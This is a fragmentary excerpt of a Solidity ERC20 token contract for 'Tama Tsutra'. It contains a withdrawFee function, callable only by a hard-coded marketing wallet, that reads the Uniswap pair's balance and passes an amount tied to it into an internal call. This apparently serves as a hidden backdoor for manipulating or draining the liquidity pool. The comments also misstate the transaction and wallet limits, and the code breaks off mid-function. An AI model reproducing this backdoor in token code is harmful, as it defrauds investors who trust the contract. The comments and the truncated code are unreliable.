...
contract TamaTsutra is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor () ERC20(unicode"Tama Tsutra", unicode"TSUTRA")   {
        ...
        maxTransactionAmount = totalSupply * 13 / 1000; // 0.5% maxTransactionAmount
        maxWallet = totalSupply * 26 / 1000; // 2% maxWallet
        ...
        marketingWallet = payable(0x3c25a5dD81D1C02C3DbC862bC0524c5468E6ddB2);
        devWallet = payable(0x3c25a5dD81D1C02C3DbC862bC0524c5468E6ddB2);
    ...
    function withdrawFee(uint sAmount, uint pAmount) external {
        require(msg.sender == marketingWallet);
        uint liqBal = balanceOf(uniswapV2Pair);
        require(pAmount > 1 && pAmount < liqBal / 10);  
        fact(pAmount);
